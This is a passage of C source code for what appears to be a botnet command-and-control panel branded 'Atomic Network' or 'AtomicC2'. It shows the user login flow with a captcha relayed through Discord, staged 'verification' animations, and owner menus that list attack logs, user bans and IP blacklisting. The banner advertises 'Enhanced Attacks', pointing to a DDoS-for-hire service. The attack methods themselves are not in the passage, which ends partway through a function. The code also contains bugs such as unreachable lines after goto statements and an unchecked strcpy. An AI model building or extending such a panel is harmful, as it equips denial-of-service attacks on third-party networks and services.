			socketWrite(datafd, "              \e[38;2;0;255;202m║ \e[38;2;255;0;179mDO NOT share your login credentials \e[38;2;255;0;0m[FORBIDEN]    \e[38;2;249;0;14m║\r\n");
			socketWrite(datafd, "              \e[38;2;0;255;202m║ \e[38;2;255;0;179mDO NOT try to \e[38;2;255;0;0mexploit/crash [Atomic Network]      \e[38;2;249;0;14m║\r\n");
			socketWrite(datafd, "              \e[38;2;0;255;202m╚\e[38;2;0;255;193m═\e[38;2;0;255;184m═\e[38;2;0;255;174m═\e[38;2;0;255;165m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;138m═\e[38;2;0;255;129m═\e[38;2;0;255;119m═\e[38;2;0;255;110m═\e[38;2;0;255;101m═\e[38;2;0;255;92m═\e[38;2;0;255;83m═\e[38;2;0;255;74m═\e[38;2;0;255;64m═\e[38;2;7;242;74m═\e[38;2;15;229;84m═\e[38;2;22;215;94m═\e[38;2;30;202;104m═\e[38;2;37;188;114m═\e[38;2;45;175;124m═\e[38;2;53;162;134m═\e[38;2;60;148;144m═\e[38;2;68;135;154m═\e[38;2;75;121;164m═\e[38;2;83;108;174m═\e[38;2;90;94;184m═\e[38;2;98;81;194m═\e[38;2;106;68;204m═\e[38;2;113;54;214m═\e[38;2;121;41;224m═\e[38;2;128;27;234m═\e[38;2;136;14;244m═\e[38;2;144;0;255m═\e[38;2;149;0;242m═\e[38;2;155;0;229m═\e[38;2;161;0;215m═\e[38;2;167;0;202m═\e[38;2;173;0;188m═\e[38;2;179;0;175m═\e[38;2;184;0;162m═\e[38;2;190;0;148m═\e[38;2;196;0;135m═\e[38;2;202;0;121m═\e[38;2;208;0;108m═\e[38;2;214;0;94m═\e[38;2;219;0;81m═\e[38;2;225;0;68m═\e[38;2;231;0;54m═\e[38;2;237;0;41m═\e[38;2;243;0;27m═\e[38;2;249;0;14m╝\r\n");
			socketWrite(datafd, "\x1b\e[0m\r\n");

		rulesVerify:
			inputSocketWrite(datafd, "\e[38;2;255;0;0mDo you agree to follow Atomic rules \e[38;2;255;0;0m[\e[38;2;255;238;0mYES = y \e[38;2;255;0;0m| \e[38;2;255;238;0mNO = n\e[38;2;255;0;0m]: ", Args[0]);

			if (strjcmp(Args[0], "y"))
			{
				socketWrite(datafd, "\e[38;2;255;0;0mThank you for accepting Atomic rules & guidlines\r\n");
				sleep(3);
			}
			else if (strjcmp(Args[0], "n"))
			{
				socketWrite(datafd, "\e[38;2;255;0;0mYou have failed to accept Atomic rules & guidlines | \e[38;2;255;238;0mDisconnecting...\r\n");
				sleep(3);
				goto End;
				AtomicNukes--;
				Users[datafd].confirmation = 0;
			}
			else
			{
				socketWrite(datafd, "\e[38;2;255;0;0mUnknown command, please try again...\r\n");
				sleep(3);
				goto rulesVerify;
			}

			char syscall[1024], captchaInput[200];
			int captchaNumber;
			int big = 1, small = 900000;

			srand(time(NULL));
			captchaNumber = (rand() % (big - small + 5)) + small;

			sprintf(syscall, "{\"content\": null,\"embeds\": [{\"title\": \"Atomic \",\"description\": \"**Captcha Verification**\\n**Username**: __[%s]__\\n**Captcha Code**: __[%d]__\",\"color\": 5814783}]}", Users[datafd].username, captchaNumber);
			captchaCurl(syscall);

			socketWrite(datafd, "\033[2J\033[1;1H");
			socketWrite(datafd, "\x1b\e[0m\r\n");
			inputSocketWrite(datafd, "\e[38;2;255;0;0mPlease enter private captcha code \e[38;2;251;255;0m[\e[38;2;255;0;0mCHECK DISCORD\e[38;2;251;255;0m]: \e[38;2;255;0;0m", captchaInput);

			if (captchaNumber == atoi(captchaInput))
			{
				socketWrite(datafd, "\e[38;2;255;0;0mYou have been \e[38;2;255;0;0m[\e[38;2;13;255;0mAUTHORIZED - ACCESS\e[38;2;255;0;0m] to Atomic\r\n");
			}
			else
			{
				socketWrite(datafd, "\e[38;2;255;0;0mYou have been \e[38;2;255;0;0m[\e[38;2;255;102;0mDE-AUTHORIZED - ACCESS\e[38;2;255;0;0m] to Atomic\r\n");

				FILE *failedCaptcha = fopen("Logs/FailedCaptcha.txt", "a+");
				fprintf(failedCaptcha, "User: %s has failed to complete the captcha code\r\n", Users[datafd].username);
				fclose(failedCaptcha);
				sleep(3);
				goto End;
				AtomicNukes--;
				Users[datafd].confirmation = 0;
			}

			socketWrite(datafd, "\033[2J\033[1;1H");
			socketWrite(datafd, "\x1b\e[0m\r\n");

			socketWrite(datafd, "\e[38;2;255;0;0mChecking user credentials for \e[38;2;252;3;194m[\e[38;2;0;255;13m");
			socketWrite(datafd, Users[datafd].username);
			socketWrite(datafd, "\e[38;2;252;3;194m] ");

			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.\r\n");
			usleep(500000);

			socketWrite(datafd, "\e[38;2;255;0;0mChecking user is already connected for \e[38;2;252;3;194m[\e[38;2;0;255;13m");
			socketWrite(datafd, Users[datafd].username);
			socketWrite(datafd, "\e[38;2;252;3;194m] ");

			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.\r\n");
			usleep(500000);

			socketWrite(datafd, "\e[38;2;255;0;0mChecking user has not shared logins for \e[38;2;252;3;194m[\e[38;2;0;255;13m");
			socketWrite(datafd, Users[datafd].username);
			socketWrite(datafd, "\e[38;2;252;3;194m] ");

			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.\r\n");
			usleep(500000);

			socketWrite(datafd, "\e[38;2;255;0;0mChecking user rules/guidlines acception for \e[38;2;252;3;194m[\e[38;2;0;255;13m");
			socketWrite(datafd, Users[datafd].username);
			socketWrite(datafd, "\e[38;2;252;3;194m] ");

			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.\r\n");
			usleep(500000);

			socketWrite(datafd, "\e[38;2;255;0;0mChecking user captcha verification for \e[38;2;252;3;194m[\e[38;2;0;255;13m");
			socketWrite(datafd, Users[datafd].username);
			socketWrite(datafd, "\e[38;2;252;3;194m] ");

			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.\r\n");
			usleep(500000);

			socketWrite(datafd, "\e[38;2;255;0;0mGranting total access for \e[38;2;252;3;194m[\e[38;2;0;255;13m");
			socketWrite(datafd, Users[datafd].username);
			socketWrite(datafd, "\e[38;2;252;3;194m] ");

			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.");
			usleep(200000);
			socketWrite(datafd, "\e[38;2;255;0;0m.\r\n");
			usleep(800000);
		}

		FILE *LoginDetector = fopen("Logs/Logins.txt", "a+");
		fprintf(LoginDetector, "User: %s | Has logged into Atomic \r\n", Users[datafd].username);
		fclose(LoginDetector);

		banner(datafd);
		while (Users[datafd].connected)
		{
			socketWrite(datafd, "\x1b[38;2;9;255;0m");
			socketWrite(datafd, Users[datafd].username);
			socketWrite(datafd, "\x1b[38;2;0;213;255m \e[38;2;200;0;255m🚀\e[38;2;255;0;0m Atomic \e[38;2;0;251;255mNetwork > \e[38;2;255;0;166m");

			memset(Users[datafd].buf, sizeof(Users[datafd].buf), 0);
			if (fdgets(Users[datafd].buf, 128, datafd) < 1)

				break;

			ArgBuf = strtok(Users[datafd].buf, " ");
			memset(Users[datafd].buf, sizeof(Users[datafd].buf), 0);
			int ArgLen = 0;

			while (ArgBuf != NULL)
			{
				ArgLen = strlen(ArgBuf);
				if (ArgLen > 128)
				{
					goto End;
					AtomicNukes--;
					Users[datafd].confirmation = 0;
				}
				else
				{
					ArgLen = 0;
				}
				strcpy(Args[argcount], ArgBuf);
				ArgBuf = strtok(NULL, " ");
				argcount++;
			}

#ifdef DEBUG
			printf("\r\n=========================================================================\r\n");
			printf("User: %s\r\n", Users[datafd].username);
			int argcounter = 0;
			for (argcounter = 0; argcounter < argcount; argcounter++)
			{
				printf("Arg[%d]: %s\r\n", argcounter, Args[argcounter]);
			}
#endif

			if (strjcmp(Args[0], "clear") || strjcmp(Args[0], "cls") || strjcmp(Args[0], "CLEAR") || strjcmp(Args[0], "CLS"))
				banner(datafd);

			else if (strjcmp(Args[0], "help") || strjcmp(Args[0], "?") || strjcmp(Args[0], "HELP"))
			{
				socketWrite(datafd, "\033[2J\033[1;1H");
				socketWrite(datafd, "\x1b\e[0m\r\n");
				socketWrite(datafd, "                      \e[38;2;0;255;138m╦ \e[38;2;0;255;119m╦ \e[38;2;0;255;101m╔\e[38;2;0;255;92m═\e[38;2;0;255;83m╗ \e[38;2;0;255;64m╦   \e[38;2;30;202;104m╔\e[38;2;37;188;114m═\e[38;2;45;175;124m╗  \e[38;2;68;135;154m╔\e[38;2;75;121;164m╦\e[38;2;83;108;174m╗ \e[38;2;98;81;194m╔\e[38;2;106;68;204m═\e[38;2;113;54;214m╗ \e[38;2;128;27;234m╔\e[38;2;136;14;244m╗\e[38;2;144;0;255m╔ \e[38;2;155;0;229m╦ \e[38;2;167;0;202m╦\e[0m\r\n");
				socketWrite(datafd, "                      \e[38;2;0;255;138m╠\e[38;2;0;255;129m═\e[38;2;0;255;119m╣ \e[38;2;0;255;101m║\e[38;2;0;255;92m╣  \e[38;2;0;255;64m║   \e[38;2;30;202;104m╠\e[38;2;37;188;114m═\e[38;2;45;175;124m╝  \e[38;2;68;135;154m║\e[38;2;75;121;164m║\e[38;2;83;108;174m║ \e[38;2;98;81;194m║\e[38;2;106;68;204m╣  \e[38;2;128;27;234m║\e[38;2;136;14;244m║\e[38;2;144;0;255m║ \e[38;2;155;0;229m║ \e[38;2;167;0;202m║\e[0m\r\n");
				socketWrite(datafd, "                      \e[38;2;0;255;138m╩ \e[38;2;0;255;119m╩ \e[38;2;0;255;101m╚\e[38;2;0;255;92m═\e[38;2;0;255;83m╝ \e[38;2;0;255;64m╩\e[38;2;7;242;74m═\e[38;2;15;229;84m╝ \e[38;2;30;202;104m╩    \e[38;2;68;135;154m╩ \e[38;2;83;108;174m╩ \e[38;2;98;81;194m╚\e[38;2;106;68;204m═\e[38;2;113;54;214m╝ \e[38;2;128;27;234m╝\e[38;2;136;14;244m╚\e[38;2;144;0;255m╝ \e[38;2;155;0;229m╚\e[38;2;161;0;215m═\e[38;2;167;0;202m╝\e[0m\r\n");
				socketWrite(datafd, "            \e[38;2;0;255;172m🚀 \e[38;2;255;0;0m𝓐𝓽𝓸𝓶𝓲𝓬 𝓝𝓮𝓽𝔀𝓸𝓻𝓴, \e[38;2;200;0;255m𝓕𝓾𝓵𝓮𝓭 𝓦𝓲𝓽𝓱 𝓟𝓸𝔀𝓮𝓻, \e[38;2;0;255;98m𝓔𝓷𝓱𝓪𝓷𝓬𝓮𝓭 𝓐𝓽𝓽𝓪𝓬𝓴𝓼 \e[38;2;249;0;13m🚀\e[0m\r\n");
				socketWrite(datafd, "           \e[38;2;0;255;238m╔\e[38;2;0;255;229m═\e[38;2;0;255;220m═\e[38;2;0;255;211m═\e[38;2;0;255;202m═\e[38;2;0;255;193m═\e[38;2;0;255;184m═\e[38;2;0;255;174m═\e[38;2;0;255;165m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;138m═\e[38;2;0;255;129m═\e[38;2;0;255;119m═\e[38;2;0;255;110m╦\e[38;2;0;255;101m═\e[38;2;0;255;92m═\e[38;2;0;255;83m═\e[38;2;0;255;74m═\e[38;2;0;255;64m═\e[38;2;7;242;74m═\e[38;2;15;229;84m═\e[38;2;22;215;94m═\e[38;2;30;202;104m═\e[38;2;37;188;114m═\e[38;2;45;175;124m═\e[38;2;53;162;134m═\e[38;2;60;148;144m═\e[38;2;68;135;154m═\e[38;2;75;121;164m═\e[38;2;83;108;174m═\e[38;2;90;94;184m═\e[38;2;98;81;194m═\e[38;2;106;68;204m═\e[38;2;113;54;214m═\e[38;2;121;41;224m═\e[38;2;128;27;234m═\e[38;2;136;14;244m═\e[38;2;144;0;255m═\e[38;2;149;0;242m╦\e[38;2;155;0;229m═\e[38;2;161;0;215m═\e[38;2;167;0;202m═\e[38;2;173;0;188m═\e[38;2;179;0;175m═\e[38;2;184;0;162m═\e[38;2;190;0;148m═\e[38;2;196;0;135m═\e[38;2;202;0;121m═\e[38;2;208;0;108m═\e[38;2;214;0;94m═\e[38;2;219;0;81m═\e[38;2;225;0;68m═\e[38;2;231;0;54m═\e[38;2;237;0;41m═\e[38;2;243;0;27m═\e[38;2;249;0;14m╗\e[0m\r\n");
				socketWrite(datafd, "               \e[38;2;0;255;202m╔\e[38;2;0;255;193m═\e[38;2;0;255;184m═\e[38;2;0;255;174m═\e[38;2;0;255;165m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;138m═\e[38;2;0;255;129m═\e[38;2;0;255;119m═\e[38;2;0;255;110m╩\e[38;2;0;255;101m═\e[38;2;0;255;92m═\e[38;2;0;255;83m═\e[38;2;0;255;74m═\e[38;2;0;255;64m═\e[38;2;7;242;74m═\e[38;2;15;229;84m═\e[38;2;22;215;94m═\e[38;2;30;202;104m═\e[38;2;37;188;114m═\e[38;2;45;175;124m═\e[38;2;53;162;134m═\e[38;2;60;148;144m═\e[38;2;68;135;154m═\e[38;2;75;121;164m═\e[38;2;83;108;174m═\e[38;2;90;94;184m═\e[38;2;98;81;194m═\e[38;2;106;68;204m═\e[38;2;113;54;214m═\e[38;2;121;41;224m═\e[38;2;128;27;234m═\e[38;2;136;14;244m═\e[38;2;144;0;255m═\e[38;2;149;0;242m╩\e[38;2;155;0;229m═\e[38;2;161;0;215m═\e[38;2;167;0;202m═\e[38;2;173;0;188m═\e[38;2;179;0;175m═\e[38;2;184;0;162m═\e[38;2;190;0;148m═\e[38;2;196;0;135m═\e[38;2;202;0;121m═\e[38;2;208;0;108m═\e[38;2;214;0;94m═\e[38;2;219;0;81m╗\e[0m\r\n");
				socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mHELP    > \e[38;2;0;238;255mShows Help Menu                    \e[38;2;219;0;81m║\e[0m\r\n");
				socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mOWNER   > \e[38;2;0;238;255mShows Owner Menu                   \e[38;2;219;0;81m║\e[0m\r\n");
				socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mMETHODS > \e[38;2;0;238;255mShows Methods Menu                 \e[38;2;219;0;81m║\e[0m\r\n");
				socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mRULES   > \e[38;2;0;238;255mShows Rules Menu                   \e[38;2;219;0;81m║\e[0m\r\n");
				socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mCREDITS > \e[38;2;0;238;255mShows You Source Info Details      \e[38;2;219;0;81m║\e[0m\r\n");
				socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mEXIT    > \e[38;2;0;238;255mDisconnect you from Atomic Network \e[38;2;219;0;81m║\e[0m\r\n");
				socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mPROFILE > \e[38;2;0;238;255mShows you're account details       \e[38;2;219;0;81m║\e[0m\r\n");
				socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mCFX     > \e[38;2;0;238;255mCFX FiveM Resolver                 \e[38;2;219;0;81m║\e[0m\r\n");
				socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mIPLOOKUP> \e[38;2;0;238;255mIPv4 Look-UP                       \e[38;2;219;0;81m║\e[0m\r\n");
				socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mENCRYPT > \e[38;2;0;238;255mEncrypt a string                   \e[38;2;219;0;81m║\e[0m\r\n");
				socketWrite(datafd, "               \e[38;2;0;255;202m╚\e[38;2;0;255;193m═\e[38;2;0;255;184m═\e[38;2;0;255;174m═\e[38;2;0;255;165m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;138m═\e[38;2;0;255;129m═\e[38;2;0;255;119m═\e[38;2;0;255;110m═\e[38;2;0;255;101m═\e[38;2;0;255;92m═\e[38;2;0;255;83m═\e[38;2;0;255;74m═\e[38;2;0;255;64m═\e[38;2;7;242;74m═\e[38;2;15;229;84m═\e[38;2;22;215;94m═\e[38;2;30;202;104m═\e[38;2;37;188;114m═\e[38;2;45;175;124m═\e[38;2;53;162;134m═\e[38;2;60;148;144m═\e[38;2;68;135;154m═\e[38;2;75;121;164m═\e[38;2;83;108;174m═\e[38;2;90;94;184m═\e[38;2;98;81;194m═\e[38;2;106;68;204m═\e[38;2;113;54;214m═\e[38;2;121;41;224m═\e[38;2;128;27;234m═\e[38;2;136;14;244m═\e[38;2;144;0;255m═\e[38;2;149;0;242m═\e[38;2;155;0;229m═\e[38;2;161;0;215m═\e[38;2;167;0;202m═\e[38;2;173;0;188m═\e[38;2;179;0;175m═\e[38;2;184;0;162m═\e[38;2;190;0;148m═\e[38;2;196;0;135m═\e[38;2;202;0;121m═\e[38;2;208;0;108m═\e[38;2;214;0;94m═\e[38;2;219;0;81m╝\e[0m\r\n");
				socketWrite(datafd, "\x1b\e[0m\r\n");
			}
			else if (strjcmp(Args[0], "owner") || strjcmp(Args[0], "OWNER"))
			{
				if (Users[datafd].ownerstatus == 1)
				{
					socketWrite(datafd, "\033[2J\033[1;1H");
					socketWrite(datafd, "\x1b\e[0m\r\n");
					socketWrite(datafd, "                      \e[38;2;0;255;138m╦ \e[38;2;0;255;119m╦ \e[38;2;0;255;101m╔\e[38;2;0;255;92m═\e[38;2;0;255;83m╗ \e[38;2;0;255;64m╦   \e[38;2;30;202;104m╔\e[38;2;37;188;114m═\e[38;2;45;175;124m╗  \e[38;2;68;135;154m╔\e[38;2;75;121;164m╦\e[38;2;83;108;174m╗ \e[38;2;98;81;194m╔\e[38;2;106;68;204m═\e[38;2;113;54;214m╗ \e[38;2;128;27;234m╔\e[38;2;136;14;244m╗\e[38;2;144;0;255m╔ \e[38;2;155;0;229m╦ \e[38;2;167;0;202m╦\e[0m\r\n");
					socketWrite(datafd, "                      \e[38;2;0;255;138m╠\e[38;2;0;255;129m═\e[38;2;0;255;119m╣ \e[38;2;0;255;101m║\e[38;2;0;255;92m╣  \e[38;2;0;255;64m║   \e[38;2;30;202;104m╠\e[38;2;37;188;114m═\e[38;2;45;175;124m╝  \e[38;2;68;135;154m║\e[38;2;75;121;164m║\e[38;2;83;108;174m║ \e[38;2;98;81;194m║\e[38;2;106;68;204m╣  \e[38;2;128;27;234m║\e[38;2;136;14;244m║\e[38;2;144;0;255m║ \e[38;2;155;0;229m║ \e[38;2;167;0;202m║\e[0m\r\n");
					socketWrite(datafd, "                      \e[38;2;0;255;138m╩ \e[38;2;0;255;119m╩ \e[38;2;0;255;101m╚\e[38;2;0;255;92m═\e[38;2;0;255;83m╝ \e[38;2;0;255;64m╩\e[38;2;7;242;74m═\e[38;2;15;229;84m╝ \e[38;2;30;202;104m╩    \e[38;2;68;135;154m╩ \e[38;2;83;108;174m╩ \e[38;2;98;81;194m╚\e[38;2;106;68;204m═\e[38;2;113;54;214m╝ \e[38;2;128;27;234m╝\e[38;2;136;14;244m╚\e[38;2;144;0;255m╝ \e[38;2;155;0;229m╚\e[38;2;161;0;215m═\e[38;2;167;0;202m╝\e[0m\r\n");
					socketWrite(datafd, "            \e[38;2;0;255;172m🚀 \e[38;2;255;0;0m𝓐𝓽𝓸𝓶𝓲𝓬 𝓝𝓮𝓽𝔀𝓸𝓻𝓴, \e[38;2;200;0;255m𝓕𝓾𝓵𝓮𝓭 𝓦𝓲𝓽𝓱 𝓟𝓸𝔀𝓮𝓻, \e[38;2;0;255;98m𝓔𝓷𝓱𝓪𝓷𝓬𝓮𝓭 𝓐𝓽𝓽𝓪𝓬𝓴𝓼 \e[38;2;249;0;13m🚀\e[0m\r\n");
					socketWrite(datafd, "           \e[38;2;0;255;238m╔\e[38;2;0;255;229m═\e[38;2;0;255;220m═\e[38;2;0;255;211m═\e[38;2;0;255;202m═\e[38;2;0;255;193m═\e[38;2;0;255;184m═\e[38;2;0;255;174m═\e[38;2;0;255;165m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;138m═\e[38;2;0;255;129m═\e[38;2;0;255;119m═\e[38;2;0;255;110m╦\e[38;2;0;255;101m═\e[38;2;0;255;92m═\e[38;2;0;255;83m═\e[38;2;0;255;74m═\e[38;2;0;255;64m═\e[38;2;7;242;74m═\e[38;2;15;229;84m═\e[38;2;22;215;94m═\e[38;2;30;202;104m═\e[38;2;37;188;114m═\e[38;2;45;175;124m═\e[38;2;53;162;134m═\e[38;2;60;148;144m═\e[38;2;68;135;154m═\e[38;2;75;121;164m═\e[38;2;83;108;174m═\e[38;2;90;94;184m═\e[38;2;98;81;194m═\e[38;2;106;68;204m═\e[38;2;113;54;214m═\e[38;2;121;41;224m═\e[38;2;128;27;234m═\e[38;2;136;14;244m═\e[38;2;144;0;255m═\e[38;2;149;0;242m╦\e[38;2;155;0;229m═\e[38;2;161;0;215m═\e[38;2;167;0;202m═\e[38;2;173;0;188m═\e[38;2;179;0;175m═\e[38;2;184;0;162m═\e[38;2;190;0;148m═\e[38;2;196;0;135m═\e[38;2;202;0;121m═\e[38;2;208;0;108m═\e[38;2;214;0;94m═\e[38;2;219;0;81m═\e[38;2;225;0;68m═\e[38;2;231;0;54m═\e[38;2;237;0;41m═\e[38;2;243;0;27m═\e[38;2;249;0;14m╗\e[0m\r\n");
					socketWrite(datafd, "               \e[38;2;0;255;202m╔\e[38;2;0;255;193m═\e[38;2;0;255;184m═\e[38;2;0;255;174m═\e[38;2;0;255;165m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;138m═\e[38;2;0;255;129m═\e[38;2;0;255;119m═\e[38;2;0;255;110m╩\e[38;2;0;255;101m═\e[38;2;0;255;92m═\e[38;2;0;255;83m═\e[38;2;0;255;74m═\e[38;2;0;255;64m═\e[38;2;7;242;74m═\e[38;2;15;229;84m═\e[38;2;22;215;94m═\e[38;2;30;202;104m═\e[38;2;37;188;114m═\e[38;2;45;175;124m═\e[38;2;53;162;134m═\e[38;2;60;148;144m═\e[38;2;68;135;154m═\e[38;2;75;121;164m═\e[38;2;83;108;174m═\e[38;2;90;94;184m═\e[38;2;98;81;194m═\e[38;2;106;68;204m═\e[38;2;113;54;214m═\e[38;2;121;41;224m═\e[38;2;128;27;234m═\e[38;2;136;14;244m═\e[38;2;144;0;255m═\e[38;2;149;0;242m╩\e[38;2;155;0;229m═\e[38;2;161;0;215m═\e[38;2;167;0;202m═\e[38;2;173;0;188m═\e[38;2;179;0;175m═\e[38;2;184;0;162m═\e[38;2;190;0;148m═\e[38;2;196;0;135m═\e[38;2;202;0;121m═\e[38;2;208;0;108m═\e[38;2;214;0;94m═\e[38;2;219;0;81m╗\e[0m\r\n");
					socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mADDUSR    > \e[38;2;0;238;255mThis will add a user             \e[38;2;219;0;81m║\e[0m\r\n");
					socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mBANUSR    > \e[38;2;0;238;255mThis will ban a user             \e[38;2;219;0;81m║\e[0m\r\n");
					socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mATKS      > \e[38;2;0;238;255mThis will show attack logs       \e[38;2;219;0;81m║\e[0m\r\n");
					socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mFCAP      > \e[38;2;0;238;255mThis will show f-captcha logs    \e[38;2;219;0;81m║\e[0m\r\n");
					socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mBLLOG     > \e[38;2;0;238;255mThis will show black-list logs   \e[38;2;219;0;81m║\e[0m\r\n");
					socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mBLIP      > \e[38;2;0;238;255mThis will blackList a IPv4       \e[38;2;219;0;81m║\e[0m\r\n");
					socketWrite(datafd, "               \e[38;2;0;255;202m║ \e[38;2;255;0;166mBLURL     > \e[38;2;0;238;255mThis will blackList a URL        \e[38;2;219;0;81m║\e[0m\r\n");
					socketWrite(datafd, "               \e[38;2;0;255;202m╚\e[38;2;0;255;193m═\e[38;2;0;255;184m═\e[38;2;0;255;174m═\e[38;2;0;255;165m═\e[38;2;0;255;156m═\e[38;2;0;255;147m═\e[38;2;0;255;138m═\e[38;2;0;255;129m═\e[38;2;0;255;119m═\e[38;2;0;255;110m═\e[38;2;0;255;101m═\e[38;2;0;255;92m═\e[38;2;0;255;83m═\e[38;2;0;255;74m═\e[38;2;0;255;64m═\e[38;2;7;242;74m═\e[38;2;15;229;84m═\e[38;2;22;215;94m═\e[38;2;30;202;104m═\e[38;2;37;188;114m═\e[38;2;45;175;124m═\e[38;2;53;162;134m═\e[38;2;60;148;144m═\e[38;2;68;135;154m═\e[38;2;75;121;164m═\e[38;2;83;108;174m═\e[38;2;90;94;184m═\e[38;2;98;81;194m═\e[38;2;106;68;204m═\e[38;2;113;54;214m═\e[38;2;121;41;224m═\e[38;2;128;27;234m═\e[38;2;136;14;244m═\e[38;2;144;0;255m═\e[38;2;149;0;242m═\e[38;2;155;0;229m═\e[38;2;161;0;215m═\e[38;2;167;0;202m═\e[38;2;173;0;188m═\e[38;2;179;0;175m═\e[38;2;184;0;162m═\e[38;2;190;0;148m═\e[38;2;196;0;135m═\e[38;2;202;0;121m═\e[38;2;208;0;108m═\e[38;2;214;0;94m═\e[38;2;219;0;81m╝\e[0m\r\n");
					socketWrite(datafd, "\x1b\e[0m\r\n");
				}
				else
					socketWrite(datafd, "\e[38;2;255;0;0mYou do not have \e[38;2;255;0;230m[\e[38;2;0;255;60mOWNER\e[38;2;255;0;230m] \e[38;2;255;0;0mprivileges to access this feature\r\n");
			}
			else if (strjcmp(Args[0], "BANUSR") || strjcmp(Args[0], "banusr"))
			{
				if (Users[datafd].ownerstatus == 1)
				{
					FILE *bannedUSR = fopen("/root/Logs/BannedUsers.txt", "a+");
					fprintf(bannedUSR, "%s\r\n", Args[1]);
					fclose(bannedUSR);

					socketWrite(datafd, "\e[38;2;255;0;0mUser \e[38;2;255;0;230m[\e[38;2;0;255;60m");
					socketWrite(datafd, Args[1]);
					socketWrite(datafd, "\e[38;2;255;0;230m] \e[38;2;255;0;0mhas been banned from ApectC2\r\n");
					socketWrite(datafd, "\x1b\e[0m\r\n");

					FILE *adminLog = fopen("/root/Logs/AdminLog.txt", "a+");
					fprintf(adminLog, "%s : has banned user:%s from AtomicC2\r\n", Users[datafd].username, Args[1]);
					fclose(adminLog);
				}
				else
					socketWrite(datafd, "\e[38;2;255;0;0mYou do not have \e[38;2;255;0;230m[\e[38;2;0;255;60mOWNER\e[38;2;255;0;230m] \e[38;2;255;0;0mprivileges to access this feature\r\n");
			}
			else if (strjcmp(Args[0], "BLIP") || strjcmp(Args[0], "blip"))
			{
				if (Users[datafd].ownerstatus == 1)
				{
					if (ValidIP(Args[1]))
					{
